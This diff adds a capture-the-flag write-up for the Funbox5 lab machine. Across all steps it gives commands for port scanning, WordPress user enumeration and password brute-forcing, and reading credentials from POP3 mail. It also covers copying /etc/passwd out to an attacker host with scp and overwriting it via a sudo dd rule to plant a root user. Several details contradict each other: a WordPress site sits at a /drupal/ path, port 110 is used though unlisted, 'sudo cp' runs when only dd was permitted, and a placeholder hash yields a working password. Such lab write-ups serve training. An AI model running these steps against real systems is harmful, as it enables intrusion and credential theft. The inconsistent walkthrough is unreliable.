@@ -1,0 +1,116 @@
+# funbox5-
+📌 README.md (Funbox5 Writeup)
+# Funbox5 CTF Writeup
+
+## 🧠 Overview
+
+Target IP: 10.0.2.12  
+Goal: Gain root access  
+
+Open Ports:
+- 22 (SSH)
+- 80 (HTTP)
+
+---
+
+# 🔍 1. Reconnaissance
+
+## Nmap Scan
+
+```bash
+nmap -sC -sV -A -p- 10.0.2.12
+Result:
+
+22/tcp open ssh
+
+80/tcp open http (Apache)
+🌐 2. Web Enumeration
+
+Found WordPress under:
+
+http://10.0.2.12/drupal/
+WPScan Enumeration
+wpscan --url http://10.0.2.12/drupal/ --enumerate u
+
+Discovered users:
+
+admin
+
+ben
+🔑 3. Password Attack
+
+Used rockyou wordlist:
+
+wpscan --url http://10.0.2.12/drupal/ -U ben -P /usr/share/wordlists/rockyou.txt
+
+Credentials found:
+
+ben : pookie
+🔓 4. SSH Access
+ssh ben@10.0.2.12
+
+Login successful.
+
+📧 5. POP3 Enumeration
+
+Connected to port 110:
+
+telnet 10.0.2.12 110
+USER ben
+PASS pookie
+LIST
+RETR 1
+
+Discovered credentials inside mail:
+
+adam : qwedsayxc!
+🔄 6. Lateral Movement
+ssh adam@10.0.2.12
+
+Login successful.
+
+⬆️ 7. Privilege Escalation
+
+Checked sudo permissions:
+
+sudo -l
+
+Found ability to run /bin/dd.
+
+Backup passwd
+sudo cp /etc/passwd /tmp/passwd
+
+Copied to Kali:
+
+scp passwd kali@10.0.2.4:/home/kali
+✏️ 8. Adding Root User
+
+Added new user with UID 0:
+
+jason:$6$jason$hashvalue:0:0:root:/root:/bin/bash
+
+Saved file and uploaded back:
+
+scp passwd adam@10.0.2.12:/tmp/paswwd1
+
+Overwrote system passwd:
+
+sudo /bin/dd if=/tmp/paswwd1 of=/etc/passwd
+👑 9. Root Access
+su - jason
+
+Password: 123456
+
+Root obtained ✅
+
+🏁 Final Result
+
+Privilege escalation achieved via:
+
+Weak credentials
+
+Mail enumeration
+
+Sudo misconfiguration
+
+/etc/passwd manipulation
